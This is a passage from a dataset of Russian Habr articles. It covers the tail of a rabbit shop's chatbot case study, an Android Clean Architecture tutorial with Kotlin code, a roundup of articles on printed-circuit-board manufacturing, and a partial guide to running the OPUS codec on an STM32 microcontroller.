кроликов. Частично его содержимое дублирует наш чат-бот, чтобы пользователи знали, что именно нужно для того, чтобы кролику было хорошо и комфортно у вас дома.Вы можете смеяться, но покупая кроликов не все задумываются о клетке, о переноске, о корме или наполнителе. Прелесть чат-бота заключается в том, что он может предложить дополнительные товары. И примерно в 40% случаев мы продаем что-то еще, действительно нужное клиенту.Сбор отзывов через ботаСегодня любому интернет-магазину нужны отзывы. И если менеджеры часто забывают попросить людей оставить отзыв, сценарий для бота подразумевает, что каждый покупатель получает предложение рассказать о нашей покупке на Авито или на Яндекс.Картах.Тут, конечно, можно спросить — а если человек не хочет оставлять отзыв? Мы не настаиваем. Но тем, кто оставит дарим 1 кг корма. Люди в большинстве случаев планируют кормить своего кролика (Пе подумайте ничего плохого! Просто кроликов часто также берут также на подарок, и тогда кормить их будет кто-то другой). Поэтому они рады оставить отзыв и получить бонус в виде корма. А для нас это впоследствии становится дополнительной возможностью продать вместе с этим 1кг что-то еще. Не поедет же человек к нам за одним только килограммом еды для кролика…После всего этого очень важно остановить сценарий, чтобы он не повторился при повторной встрече с клиентом и не досаждать ему “ботовой тупостью”, которая появляется только при неправильном программировании бота.      ЗаключениеНа сегодняшний день я использую разные уровни работы с чат-ботом, максимально снижая нагрузку на менеджеров, которые ведут все общение с клиентами через ChatApp. При этом подключение к Tilda оказалось одним из самых результативных направлений автоматизации — простое подключение ChatApp через вебхук к уже созданной структуре обработки заявок позволило оптимизировать работу менеджера, обеспечить дополнительные продажи, а также эффективно собирать обратную связь и отзывы.В сумме использование чат-бота на базе ChatApp позволило мне увеличить прибыль в 3,2 раза за счет более быстрой и эффективной обработки лидов. Мы повысили конверсию с Авито на 70%, а также выстроили наиболее толковые сценарии для общения в WhatsApp. Схема автоматизации взаимодействия с Tilda помогла экономить до 30% времени менеджеров, которое раньше уходило на оформление заказов, при том что стоимость чатбота (убедитесь сами) оказывается намного ниже зарплаты менеджера. При этом я старался делать так, чтобы чат-бот не мешал, а только помогал и менеджеру, и клиенту. И за это время у нас не было ни одной жалобы, что на заявки отвечает чат-бот. ",2024-01-26
Просто об архитектуре в Android,6,0,https://habr.com/ru/companies/bsl/articles/788940/,"В современном мире разработки выбор подходящей архитектуры - сложная задача. Все разработчики стремятся к тому, чтобы их код был чистым, поддерживаемым и масштабируемым.В нашем скромном мире разработки Android есть общепринятый подход к проектированию приложений - Clean Architecture, который рекомендуется Google. Несмотря на множество статей, посвященных этому стандарту, вопросы и споры вокруг того, как ""правильно готовить"" Clean Architecture, остаются актуальными.Меня зовут Артем, я Android developer BSL. В данной статье я рассмотрю один из возможных путей - простота и гармоничность на основе Clean Architecture. Важно понимать, что это всего лишь один из вариантов, который основан на моем личном видении. В мире разнообразных подходов не существует идеала, и, возможно, именно в этом заключается привлекательность процесса разработки - в бесконечных спорах и поиске оптимального решения.Почему именно Clean ArchitectureПри проектировании архитектуры следует обращать внимание на тип вашего приложения, объем планируемой бизнес-логики в нем или наоборот её отсутствие. Немаловажными факторами являются отведенные сроки, размер команды и перспектива интеграции в нее новых членов. Вне зависимости от специфики вашего проекта, Clean Architecture становится превосходным выбором. Вот почему:Разделение ответственности (масштабируемость, минимизация проблем с зависимостями)ТестируемостьУстойчивость к изменениямПопулярность (большое кол-во гайдлайнов, шаблонов)Основополагающие принципыРассмотрим самые базовые принципы Clean Architecture, за счет которых она таковой и является:Единственная ответственностьКаждый слой (модуль), класс или функция выполняет только одну задачу. Данный принцип призван конкретизировать ответственность отдельных по смыслу классов или слоев, что в свою очередь придает ясность в код и снижает его связанность.Схематичное представление слоев и их взаимодействияРазделение на слои Приложение должно быть разбито на слои, у каждого слоя своя зона ответственности. Обычно выделяют следующие уровни: presentation, domain, data.Presentation: отвечает за отображение пользовательского интерфейса и реагирование на его событияDomain: бизнес-логика, изолированная от деталей реализации, определяет правила и операции, как приложение должно взаимодействовать с данными Data: хранилище данныхИнверсия зависимостейОдин из важнейших принципов который гласит о том, что стоит использовать общий контракт, такой как интерфейс или абстрактный класс, вместо прямой зависимости слоя верхнего уровня от компонентов слоя нижнего. Таким образом, каждый слой использует этот контракт, что обеспечивает изоляцию изменений в верхнем слое.В Clean Architecture центральным слоем является domain, тогда можно схематично представить подобную связь зависимостей:ПроектируемНачнем практическую часть, в которой рассмотрим каждый слой и его особенности на примере мини-приложения ленты с “котами”, используя Cat API.Будем использовать многомодульный подход по структуре слоев в Clean Architecture, добавив опциональный модуль common.P.S: buildSrc рассматриваться не будет, это модуль для централизации зависимостей и определения тасок для gradle.Так как инверсия зависимости является архитектурным принципом, для его реализации будем использовать практическую реализацию (Hilt).Domain слойСодержит бизнес-логику, должен быть независим от деталей реализации приложения и внешних библиотек (можно делать исключения, пример RxJava, DI Framework). Это делает его высокоуровневым слоем.Исходя из описания, определим две зависимости для модуля domain: зависимость на Hilt и опциональный модуль common.plugins {
    id(""com.android.library"")
    id(""org.jetbrains.kotlin.android"")
    id(""com.google.dagger.hilt.android"")
    kotlin(""kapt"")
}

android {
    namespace = ""com.bsl.domain""
}

dependencies {
    implementation(project("":common""))

    // DI
    implementation(libs.hilt.android)
    kapt(libs.hilt.compiler)
}domain:build.gradle.ktsОпределимся с основными компонентами:Entity: представляет объекты данных, с которыми работает бизнес-логикаInteractor или UseCase: содержит функциональность или операцииRepository: обеспечивает контракт для доступа к даннымТеперь, соответствуя нашей задаче, реализуем эти компоненты, определим бизнес-логику для получения списка котов.В начале создадим сущность, определим класс CatModel и объявим в нем следующие поля: идентификатор, ссылка на изображение и наличие лайка.package com.bsl.domain.cat.model

data class CatModel(
    val id: String,
    val imageUrl: String,
    val isLiked: Boolean,
)Использование постфикса Model. Добавляем его к нашим сущностям (Entity). В принципе это не обязательно, и мы можем вместо этого, к примеру, использовать CatEntity или просто Cat.Приступим к созданию контракта для получения данных. Определим CatRepository с методом получения всех котов и отметки лайка для определенного кота.package com.bsl.domain.cat.repository

import com.bsl.domain.cat.model.CatModel

interface CatRepository {
    suspend fun getCats(limit: Int): List<CatModel>
    suspend fun setLike(value: Boolean, id: String)
}Обычно в Clean Architecture отдельный репозиторий предоставляет чтение или запись данных в рамках определенной сущности и именуется соответственно ей.Теперь мы готовы описать саму логику, она будет достаточно простая:Вытащить данныеПоставить лайк и наоборотНо сначала следует разобраться, что стоит использовать, Interactor или UseCase?UseCase: представляет собой конкретную операциюInteractor: является комплексом операций над сущностьюПо сути различие в том, как мы хотим разделить наши бизнес-операции.На этом вся работа в domain модуле выполнена и мы сюда больше не вернемся. По итогу у нас получилась такая структура модуля:Data модульОтвечает за доступ к данным (локальным и удаленным) и их управлением. Модуль является низкоуровневым, допустимы любые зависимости.Определим зависимости модуля, где выбор библиотек для управления данными остается за вами:plugins {
    id(""com.android.library"")
    kotlin(""android"")
    kotlin(""plugin.serialization"")
    id(""com.google.dagger.hilt.android"")
    kotlin(""kapt"")
}

android {
    namespace = ""com.bsl.data""
}

dependencies {
    implementation(project("":common""))
    implementation(project("":domain""))

    // DI
    implementation(libs.hilt.android)
    kapt(libs.hilt.compiler)

    // Ваши библиотеки для работы с данными
}data:build.gradle.ktБазовыми компонентами данного модуля являются:Repository Implementation: реализованные контракты репозиториев, которые мы определили в domain модулеData Sources: конкретные реализации, обеспечивающие доступ к данным из различных источников (база данных, API)Data Models: объекты данных, представляющие хранимую информацию. Включает в себя DTO (Data Transfer Objects), объекты для операций CRUD (Create, Read, Update, Delete), а также объекты запросов (Query) и т.дMappers: преобразование объектов данных, к примеру в EntityНачнем с определения объектов данных API:internal typealias CatResponseList = List<CatResponseModel>
@Serializable
internal data class CatResponseModel(
    @SerialName(""id"") val id: String,
    @SerialName(""url"") val url: String,
)После этого стоит сделать маппер для трансформации объекта данных в сущность бизнес-логики. Я приведу пример с использованием экстеншен подхода, так как он является достаточно лаконичным в контексте языка Kotlin и простым.internal fun CatResponseModel.mapToDomainModel(isLiked: Boolean) =
    CatModel(id, url, isLiked)

internal fun CatResponseList.mapToDomainModels(
    isLikedGetter: (String) -> Boolean,
) = map { it.mapToDomainModel(isLiked = isLikedGetter(it.id)) }Т.к isLiked будет предоставляться внешним компонентом, то мы прокидываем его с помощью параметров.Пора определить наши источники данных (Data Source), которые будут предоставлять объекты или их частицы данных. Они могут быть разделены на три типа: Remote: обращения к внешнему API для получения данныхMemory: взаимодействие с данными, хранящимися в оперативной памятиLocal: чтение данных из локальной базы данныхПроиллюстрирую пример использование источников данных типа Memory и Remote. Для хранения данных в памяти применю структуру HashMap, в то время как для обращения к API используется библиотека Ktor.internal class CatMemoryDataSource @Inject constructor(
    private val referencesCache: ReferencesCache,
) {

    fun setLike(value: Boolean, id: String) =
        referencesCache.setValue(id, Reference.CatLike, value)

    fun getLike(id: String, defaultValue: Boolean = false) =
        referencesCache.getValue(id, Reference.CatLike) ?: defaultValue
}internal class CatRemoteDataSource @Inject constructor(private val httpClient: HttpClient) {

    suspend fun getCats(limit: Int) = httpClient.get {
        url(GET_CATS_PATH)
        parameter(LIMIT_PARAM, limit)
    }.body<CatResponseList>()

    companion object {
        private const val ROOT = ""https://api.thecatapi.com/v1/images""
        private const val GET_CATS_PATH = ""$ROOT/search""

        private const val LIMIT_PARAM = ""limit""
    }
}На практике код можно сделать чище, но в рамках показательности выбран именно такой подход.Имея сущность данных и её источники, мы можем реализовать репозиторий.internal class CatRepositoryImpl @Inject constructor(
    private val catRemoteDataSource: CatRemoteDataSource,
    private val catMemoryDataSource: CatMemoryDataSource,
) : CatRepository {

    override suspend fun getCats(limit: Int): List<CatModel> =
        catRemoteDataSource.getCats(limit)
            .mapToDomainModels(isLikedGetter = { catMemoryDataSource.getLike(it) })

    override suspend fun setLike(value: Boolean, id: String) =
        catMemoryDataSource.setLike(value, id)
}На этом наша работа здесь завершена, так выглядит наша структура модуля:PresentationОтвечает за отрисовку пользовательского интерфейса и управление его состояния на основе бизнес-сущностей. Модуль является низкоуровневым, допустимы любые зависимости.Основные компоненты:View: сам пользовательский UI в виде Fragment, Activity, ComposablePresenter / ViewModel: посредник между UI и бизнес-логикой в модельном виде MVVM, MVP, MVIОпределим зависимости модуля:plugins {
    id(""com.android.library"")
    kotlin(""android"")
    kotlin(""plugin.serialization"")
    id(""com.google.dagger.hilt.android"")
    kotlin(""kapt"")
    id(""com.google.devtools.ksp"")
}

android {
    namespace = ""com.bsl.presentation""

    buildFeatures {
        compose = true
    }
    composeOptions {
        kotlinCompilerExtensionVersion = compose.versions.compiler.get()
    }
    packagingOptions {
        resources {
            excludes += ""/META-INF/{AL2.0,LGPL2.1}""
        }
    }
}

dependencies {
    implementation(project("":domain""))
    implementation(project("":common""))
    
    // ...
}Начнем с реализации ViewModel. Я буду использовать презентационный паттерн MVI, используя его примитивную реализацию с референсом на MVI Orbit (Github).Определим состояние экрана:data class CatListState(val cats: ImmutableList<CatModel> = persistentListOf())Использование ImmutableList оправдано поддержанием стабильности типов для Compose. Если у вас XML верстка, то, думаю, можно обойтись обычным List.Теперь определяем нашу ViewModel:@HiltViewModel
class CatListViewModel @Inject constructor(private val catInteractor: CatInteractor) :
    StatefulViewModel<CatListState, EmptySideEffect>(CatListState()) {

    fun onLoad() = intent {
        val cats = catInteractor.getRandomCats()
        reduceState { state.copy(cats = cats.toImmutableList()) }
    }
}Часть с View будет самостоятельной на ваш вкус.Модуль commonМодуль предназначен для распространения утилит во все остальные модули. Если требуется, чтобы экстеншен/класс был доступен везде, то здесь ему место. Плохой практикой является добавление зависимостей относящихся к другим слоям (room, ktor, compose, view). Зависимости, которые могут относиться ко всем слоям - разрешены и должны распространятся через api dependency (logcat, coroutines, DI framework). Рекомендую следовать данному правилу, иначе в domain слое будут доступны экстеншены, к примеру, над View, что является грубой ошибкой.В целом, все утилиты можно хранить и в domain слое, в зависимости от предпочтений и потребностей проекта.Делюсь опытом (Best Practices)Мной был продемонстрирован в некотором роде базовый взгляд на Clean Architecture, который, по моим наблюдениям, применяется в большинстве проектов разных размеров. Теперь несколько советов, как нам облегчить или, наоборот, усложнить наши задачи.Интерфейсы ради интерфейсовНе создавайте интерфейсы, если в этом нет практической необходимости, так как это может усложнить структуру кода. Например, если маппер предназначен исключительно для конкретной задачи и маловероятно, что он будет иметь несколько реализаций в будущем, не стоит создавать интерфейс для него. Если вдруг возникнет  потребность в нескольких реализациях, рекомендую создавать интерфейс только для конкретного случая. В общем, никто вам не запрещает опустить интерфейсы для Interactor или UseCase.ДанныеДанные, предназначенные для отображения в пользовательском интерфейсе, должны поставляться уже готовыми. Для этого следует использовать мапперы для преобразования данных из формата data -> domain -> ui.К примеру, не следует форматировать дату в определенном виде в domain слое или непосредственно во View. Лучше сделать это в ViewModel/Presenter в контексте стейта экрана или другого POJO объекта.МногогранностьИзбегайте монотонного использования одного и того же паттерна или подхода во всем приложении, так как это может нанести вред. Например, если проще реализовать что-то с использованием MVVM, чем MVI, то стоит выбрать наиболее удобный вариант.Организация функциональности приложенияВсегда стоит разбивать функциональность приложения на фичи. Это может быть отдельный экран, диалог, или даже логика без UI составляющей. Определенно бывает так, что какой нибудь DateUtils с десятками методов форматирования даты может вполне себе зайти за фичу.ДокументированиеХотя говорят, что хороший код не требует документации, все же целесообразно предоставлять краткие описания для понимания участков кода. Даже если код написан чисто и эффективно, добавление коротких комментариев может значительно облегчить восприятие его назначения и функциональности.ЗаключениеЯ продемонстрировал вам, как реализовать Clean Architecture на основе многомодульной архитектуры, мы рассмотрели зону ответственности и основные компоненты каждого слоя. В этой статье на Хабр я постарался предоставить простое и понятное объяснение Clean Architecture. Надеюсь, что она поможет вам лучше понять этот подход к проектированию приложений.Простота — это нечто большее, чем отсутствие сложности. Простота — это величайшее оружие.",2024-01-26
Цикл статей от технолога по запуску печатных плат в производство: от выбора материалов до поиска ошибок проектирования,5,1,https://habr.com/ru/companies/yadro/articles/789010/,"Нормы проектирования печатных плат зафиксированы в ряде многостраничных спецификаций, которыми пользуются специалисты. При этом есть нюансы, о которых можно узнать лишь на практике. Проводником в непростой мир изготовления печатных плат для вас станет Александр Патутинский, технолог по подготовке и запуску печатных плат в производство и специалист по DFM- и DFA-анализам. Цикл из трех статей погрузит вас в тему — от выбора материалов для производства плат до особенностей, которые стоит учесть в конструкторской документации, чтобы защититься от проблем на этапе автоматизированного монтажа компонентов на плате. Вы также познакомитесь с подходами Design for Manufacturing (DFM) и Design for Assembly (DFA), которые Александр постарался доступно объяснить. Все технологические нюансы проиллюстрированы схемами и примерами ошибок при проектировании (а также вариантов их исправления). Подборка будет полезна и тем, кто хочет комплексно изучить тему проектирования печатных плат, и специалистам, которые уже работают на производстве.Из чего делают печатные платы: требования к базовым материалам Скорее всего, каждый из вас представляет, как выглядит печатная плата — примеры любой сложности можно увидеть во многих устройствах, которыми мы пользуемся в быту. Производство любой платы начинается с выбора материалов, среди основных — медная фольга, коры и препреги. И каждый из материалов поставляется в десятках видов и марок, которые отличаются базовыми характеристикам. Их выбор зависит от ряда факторов, главный из которых — производственный стек, используемый выбранной вами фабрикой.В вопросе выбора материалов нет предела точности. Так, от степени шероховатости фольги зависит проводимость высокоскоростных сигналов, а плотность плетения препрегов и коров комплексно влияет на процесс производства. В статье Александр рассказывает, как инженеры рассчитывают параметры материалов и выбирают наиболее подходящие под запрос заказчика и возможности фабрик. Типы плетения препрегов в порядке уплотнения.Из статьи вы узнаете: Базовые правила и формулы для расчета шероховатости фольги. Подробнее о шероховатости фольги при проектировании высокоскоростных печатных плат читайте в нашем материале.Какие типы вязки препрегов бывают и как они выглядят на снимках. Что такое температура стеклования и как технологи рассчитывают правильную. Как рассчитать нужный процент содержания смолы в плетениях препрегов, чтобы ее хватило для заполнения зазоров.  Читать статью →Как топологу повысить качество и снизить стоимость разработки платы: подход DFM Design for Manufacturing (DFM) — это дизайн печатной платы, оптимизированный под производство. Он включает в себя свод правил и технологических норм, которые учитывают особенности массового выпуска печатных плат. Во второй статье цикла Александр Патутинский буквально составил чек-лист для тополога: что стоит проверить инженеру в проекте, прежде чем отдать в работу технологу. Возможно, после этих проверок потребуется время на его доработку, но это лучше, чем тратить еще 2-3 недели на согласование изменений от технолога. Среди параметров проверки — контроль отступов между проводящими слоями и слоями механообработки, наличие кислотных ловушек, проверка процессов механообработки, ошибок невнимательности.  Ошибка, при которой возникают кислотные ловушки (выделены на рисунке) — не довести линию до центра контактной площадки.Как чек-лист этот текст сработает для топологов, технологов и всех, кто уже работает в R&D и на производствах. Но популярный формат текста позволит узнать больше также энтузиастам и те, кто только хочет войти в индустрию. Из статьи вы узнаете: Какие дефекты возникают из-за невнимательности инженера чаще всего.Как цвет паяльной маски влияет на отражающую способность.Почему важно учитывать фактор травления при оценке зазоров между проводниками.  Как выглядят кислотные ловушки в медных слоях и почему лучше не оставлять их для исправления технологам.Какие виды и структуры переходных отверстий бывают. Читать статью →Собираем печатную плату на массовом производстве: подход DFAВ этой статье рассмотрим подход Design for Assembly (DFA) — проектирование для сборки. Он подразумевает набор методов, который гарантирует, что сборка компонентов на плате пройдет штатно и не приведет к продуктовому браку. Поскольку монтаж компонентов — это автоматизированное действие, его успех зависит от качества конструкторской документации. О нюансах, которые стоит учесть при ее составлении, рассказывает Александр Патутинский. Как и в прошлых текстах, особенностей много, но есть универсальный совет: ориентироваться на возможности выбранного производителя. Помимо рекомендаций, в тексте вы найдете поучительную демонстрацию последствий неправильной конструкции. Например, компоненты могут плавать на припое и смещаться относительно точки установки — вплоть до полного слипания и короткого замыкания на плате. Из статьи вы узнаете: Какие типы упаковки компонентов существуют: ленты, паллеты, пеналы. Зачем подбирать компоненты с одинаковым термопрофилем. Как образуются надгробные камни на платах. Какую информацию о фабрике важно получить перед составлением конструкторской документации. На видео — образование надгробного камня при пайке.Читать статью →",2024-01-26
Запускаем кодек OPUS на микроконтроллере,4,0,https://habr.com/ru/articles/789220/,"Исходные данные – есть контроллер STM32 с очень ограниченной памятью, а мы хотим записывать на нем звук. Допустим, что примеров с подключением выбранного нами микрофона гора и маленькая тележка. В итоге имеем контроллер, который умеет выдавать нам WAV-подобный сигнал. Хотелось бы этот WAV-сигнал куда-то записать или передать. Таких данных будет очень много, есть ненулевая вероятность, что мы не влезем по полосе пропускания используемого канала или заполним память до того, как получим нужную информацию. На помощь нам спешит компрессия!А именно абсолютно бесплатный, открытый и очень производительный кодек OPUS. Именно он используется в большинстве стриминговых сервисов – как самостоятельно, так и в качестве обработчика звуковых дорожек. Насколько он прекрасен – можно почитать будет в другом месте. Мы же будет заводить его на ограниченном по памяти микроконтроллере:RAM (xrw) : ORIGIN = 0x20000000, LENGTH = 48KRAM2 (xrw) : ORIGIN = 0x10000000, LENGTH = 16KFLASH (rx) : ORIGIN = 0x8000000, LENGTH = 256KДанный кодек имеет обширное количество настроек. Каждая их них определенным образом влияет на качество получаемого звука, скорость обработки и т.д., что очевидно. Первая проблема с которой можно столкнуться – как оценить качество звука после процесса компрессии/декомпрессии? Можно субъективно послушать результат или посмотреть спектрограммы. Кодек включает в себя два других сильно измененных кодека: SILK и CELT. Оба лучше работают в своих условиях – SILK, например, лучше справляется с разговорной речью, но имеет ограничение по полосе частот. OPUS-кодер может работать в трех режимах: SILK, CELT и HYBRID. Названия достаточно говорящие, чтобы понять, что они из себя представляют. Что мы сделаем в данном проекте? Подключим библиотеку Opus, обработаем звуковые данные через него и сформируем опус-файл.Итак, начнем.В первую очередь, нужно скачать стабильные исходные коды с сайта производителя (https://opus-codec.org/). На момент написания статьи самая свежая версия была 1.3.1Предположим, вы уже создали проект. Распаковывем архив и добавляем к проекту файлы кодека.В настройках проекта добавим путь OPUS_ROOT до папки с кодекомВ настройках препроцессора добавим следующие определенияVAR_ARRAYS – кодировщик будет использовать массивы переменной длины для хранения вычислений. Если версия компилятора не поддерживает С99, то стоит использовать макрос USE_ALLOCA DISABLE_FLOAT_API и FIXED_POINT ускоряют вычисления на микроконтроллере и уменьшают используемую память.OPUS_BUILD – тут все понятно.Вместо прописывания данных макросов непосредственно в настройках компиляции проекта, тоже самое можно сделать через файл config.h, который идет вместе с кодировщиком.А сейчас неинтересная часть. Нужно исключить или удалить из проекта все файлы, которые не относятся к используемому контроллеру, процессору и настройкам. Это все файлы и папки, содержащие в названии _test, _demo, _float, _ne10, _multistream_, mips, doc, win32, arm64, tests, а также ассемблерные файлы (.S), где прописаны инструкции для процессора с поддержкой neon. Правой кнопкой по файлу (Alt+Enter) -> Properties -> Execute resource from buildЕсли что-то пропустили, ничего страшного. В любом случае, компилятор подскажет, что что-то осталось или просто не будет компилировать если этот функционал не используется.Как у меня теперь выглядит папка с библиотекой opus в проекте:SrcIncludeПапка silk слишком большая, поэтому покажу только исключенные файлыТоже самое с celtАх, да, не забываем добавить include pathsГотово. Далее, для работы с кодировщиком, нужно подключить в main.c следующие заголовочные файлы#include ""opus.h""
#include ""opus_types.h""
#include ""opus_private.h""Проект подготовлен для работы. Сейчас мы немного обсудим структуру .opus файлов, чтобы мы могли формировать их. Да, кодировщик принимает на вход поток PCM (ИКМ) последовательности из которой формирует свой поток закодированных данных. Но эти данные будет невозможно воспроизвести на приемной стороне, если их правильно не упаковать. Например, TI в своем примере с opus вводят эдакий промежуточный вариант упаковки этих последовательностей, чтобы можно было декодировать обратно то, что мы записали. Но мы же хотим получить прям нормальные .opus файлы, которые можно открыть на пк с любого плеера! Такой вариант не годится. В примере от ST тоже использовался промежуточный контейнер. Давайте делать нормально без настолько некрасивых костылей.Откроем любой opus файл через hex редактор и что же мы увидимПо всему видно, что opus файл состоит из Ogg контейнеров, внутри которых расположены данные кодека OPUS. Что из себя представляет Ogg контейнерКартинка с викиНе буду расписывать каждое из полей – их описание  есть на вики и на сайте разрабов Ogg. Остановлю внимание лишь на самом не очевидным для меня. Даже после прочтения документации (https://xiph.org/ogg/doc/rfc3533.txt)Header Type0x02 для самого первого0x04 для самого последнегоЭто все верно. А вот для тех, кто МЕЖДУ ними Header Type должен быть 0x00, если только это не разбитый на 2 “Ogg-страницы” пакет с данными, что бывает крайне редко.Granule PositionНепереводимая и плохо описанная гадость-кровопийца. Представляет собой число, которое показывает сколько PCM сэмплов было закодировано за ВСЕ предыдущие страницы ПЛЮС данная страница.Это можно узнать при работе энкодера и сборке файла. Представим ситуацию – у вас микрофон записывает данные, программа засовывает их в кодировщик, собирает пакеты (страницы, Page) и отправляет на ПК.Например только стартанули, вот вы засунули 600 первых сэмплов с микрофона в кодировщик, а он выплюнул N сэмплов закодированных. Потом еще вы засунули 700 сэмплов, а он выплюнул M закодированных. Так вот Granule Position для первого пакета (страницы) будет 600, а для второго пакета 600+700=1300. И так далее.Bitstream serial numberО, а эта моя любимая.ДокументацияThis unique serialnumber is created randomly and does not have any connection to the content or encoder of the logical bitstream it represents.Наверное, это очевидно. Но это просто совершенно случайное число, которое ОДИНАКОВОЕ для кажной страницы (пакета) для данного аудиострима. И это число придумываете/генерируете ВЫ, а не опус или кодировщик.Page sequence numberПросто номер “Ogg-страницы”. Начинается с 0.Чек-суммаНичего сложного, но нужно быть внимательнымХекс-редактор HxD позволяет ее посчитать для тестов, например.Для подсчета КС, нужно вписать нули на место КС и выделить всю страницу (1 Ogg-пакет)Переходим в Анализ->Контрольные суммыКонтрольная сумма считается по полиному 4C11DB7. Результатом будет следующее:Как видно, контрольная сумма правильная, но развернута.Page SegmentsЧисло, которое описывает количество сегментов таблицы, которые будут далее.Segment TableПервым идет массив длин сегментов таблицы. Длина данного массива описывается числом в Page Segments. После этого массива идут непосредственно сами данные.Пример 1 – искусственно созданный мелкий файлВ данном примере у нас Page Segments равен 1. Значит длина массива, который находится после него будет равна 1. У нас массив длин из одного числа, который равен 0x31. Значит после данного массива идет 0x31 (49) штук данных.Пример 2 – реальный файлВ данном примере у нас Page Segments равен 0x7F (247). Далее идет массив длиной 247 – выделен для наглядности. Каждая ячейка массива описывает длину одного сегмента данных. После него идут непосредственно данные. Их примерно, 14000 в данной странице (пакете).Сам Opus и его параметры(OpusHead и OpusTags которые будут считаны декодером) располагаются в секциях Segment Table 2-х первых Ogg-контейнеровОписание данных полей есть в документе RFC 7845 на сайте Opus. Каждое после достаточно хорошо описано без двусмысленности и необходимости копать глубже, чем надо. Поэтому дублировать информацию не буду.Вернемся к проекту.Данные для энкодера можно брать напрямую с микрофона. В этом проекте будет сжиматься информация из wav-файла. Wav-файл был оформлен в виде массива, который подключается через .h файл. Для формирования выходного файла использовал следующий скрипт на питоне:f_in = open('example.wav', 'rb')
f_out = open('PCM_data.h', 'wb')

cntr = 0
while True:
    data = f_in.read(1)#[::-1]#reverse bytes
    cntr += 1
    if not data:
        break
    if cntr == 1:
        continue
    elif cntr == 4:
        cntr = 0
    else :
        f_out.write(data)

f_in.close()
f_out.close()Все просто – имя входного и выходного файлов. В выходном файле дописать название массива и поставить скобку в конце.Первое, что нужно сделать – распарсить формат(преамбулу) WAV-файла. Она достаточно простая и однозначная. Не буду её описывать по пунктам, т.к. есть прекрасные сайты с пояснениями (http://soundfile.sapp.org/doc/WaveFormat/). Стоит лишь обратить внимание, что некоторые из полей имеют little endian, а некоторые big endian.Добавим данные wav-файла и файл для расчета crc. Весь код будет в main.c друг за другом.#include ""PCM_data.h""
#include ""crc.h""Объявим два дефайна – размер окна обработки в мс и размер обработчика в байтах.#define OPUS_FRAME_SIZE_IN_MS 10
#define OPUS_SIZE 880Создадим структуру для парсинга преамбулы. typedef struct
{
    uint8_t ui8ChunkID[4];
    uint32_t ui32ChunkSize;
    uint8_t ui8Format[4];
    uint8_t ui8SubChunk1ID[4];
    uint32_t ui32SubChunk1Size;
    uint16_t ui16AudioFormat;
    uint16_t ui16NumChannels;
    uint32_t ui32SampleRate;
    uint32_t ui32ByteRate;
    uint16_t ui16BlockAlign;
    uint16_t ui16BitsPerSample;
    uint8_t ui8SubChunk2ID[4];
    uint32_t ui32SubChunk2Size;
}
tWaveHeader;Теперь создадим структуру для создания Ogg-контейнеров(страниц). typedef struct
{
    uint32_t capture_pattern;
    uint8_t version;
    uint8_t header_type;
    uint32_t granole_pos_l;
    uint32_t granole_pos_h;
    uint32_t bitstream_sn;
    uint32_t page_seq_num;
    uint32_t checksum;
    uint8_t segments_length;
    uint8_t page_segments;
}
tOggHeader;Так же укажем, что есть массив данных от wav и объявим обе созданные структуры. Объявим энкодер OPUS’aextern uint8_t sound_wav_u8[];

tWaveHeader sWaveHeader;
tOggHeader current_opus_header;

OpusEncoder *sOpusEnc;Для уменьшения размера массива, отведенного под хранение результатов работы кодека, я упаковываю и отправляю по одному сегменту в одной странице. То есть в каждой из страниц будет по одному Page Segments.  current_opus_header.capture_pattern = 0x5367674F;    //OggS
  current_opus_header.header_type = 0x00; 
  current_opus_header.version = 0x00;    //Всегда 0
  current_opus_header.bitstream_sn = 0x11111111;
  current_opus_header.granole_pos_l = 0;
  current_opus_header.granole_pos_h = 0;
  current_opus_header.page_seq_num = 2;
  current_opus_header.segments_length = 0x01;Вот тут поясню (current_opus_header.page_seq_num = 2). Это значит, что я пропустил первые две страницы. В первых двух страницах содержится информация для декодера OPUS. У меня входные данные не меняются, поэтому и хедеры тоже всегда одинаковые и их дописываю сам через хекс-редактор. Если данные будут у вас разные, то нужно добавлять формировку OPUS-хедеров, что не должно быть сложно, т.к. он тоже упакован в контейнер Ogg.Парсим данные wavmemcpy(&sWaveHeader, sound_wav_u8, sizeof(sWaveHeader));Создаем энкодерint32_t  i32error;
sOpusEnc = opus_encoder_create(sWaveHeader.ui32SampleRate, sWaveHeader.ui16NumChannels, OPUS_APPLICATION_AUDIO, &i32error);OPUS_APPLICATION_AUDIO сообщает энкодеру, что у нас предполагается использование данных с широким спектром. OPUS_APPLICATION_VOIP, например, нацелен на более качественный голос.Настраиваем энкодер в режиме работы только с celt. Гибридный метод при заданных настройках также будет использовать celt. Режим же SILK требует намного больше оперативной памяти для выполнения, чем у нас есть в контроллере.opus_encoder_ctl(sOpusEnc, OPUS_SET_BITRATE((sWaveHeader.ui32SampleRate*2)));
opus_encoder_ctl(sOpusEnc, OPUS_SET_BANDWIDTH(OPUS_BANDWIDTH_SUPERWIDEBAND));
opus_encoder_ctl(sOpusEnc, OPUS_SET_VBR(1));
opus_encoder_ctl(sOpusEnc, OPUS_SET_VBR_CONSTRAINT(0));
opus_encoder_ctl(sOpusEnc, OPUS_SET_COMPLEXITY(0));
opus_encoder_ctl(sOpusEnc, OPUS_SET_INBAND_FEC(0));
opus_encoder_ctl(sOpusEnc, OPUS_SET_FORCE_CHANNELS(1));
opus_encoder_ctl(sOpusEnc, OPUS_SET_DTX(0));
opus_encoder_ctl(sOpusEnc, OPUS_SET_PACKET_LOSS_PERC(0));
opus_encoder_ctl(sOpusEnc, OPUS_SET_LSB_DEPTH(sWaveHeader.ui16BitsPerSample));
opus_encoder_ctl(sOpusEnc, OPUS_SET_EXPERT_FRAME_DURATION(OPUS_FRAMESIZE_10_MS));
opus_encoder_ctl(sOpusEnc, OPUS_SET_FORCE_MODE(MODE_CELT_ONLY));OPUS_BANDWIDTH_SUPERWIDEBAND = 12 кГц ширина полосы.OPUS_SET_VBR(1) – переменный битрейт качества.OPUS_SET_BITRATE((sWaveHeader.ui32SampleRate * 2)) – выходной битрейт я выставил в два раза больше, чем входной.Объявим массив для вывода данных из энкодера:uint8_t pui8data[150];Так как на вход OPUS принимает 16-битные данные, нам нужно форматировать входные данные, поэтому объявим его и посчитаем размер.opus_int16 *popi16fmtBuffer;
uint32_t ui32Sizeofpopi16fmtBuffer;

popi16fmtBuffer = (opus_int16 *)calloc((((sWaveHeader.ui32SampleRate * OPUS_FRAME_SIZE_IN_MS * sWaveHeader.ui16NumChannels)/1000) + 1), sizeof(opus_int16));
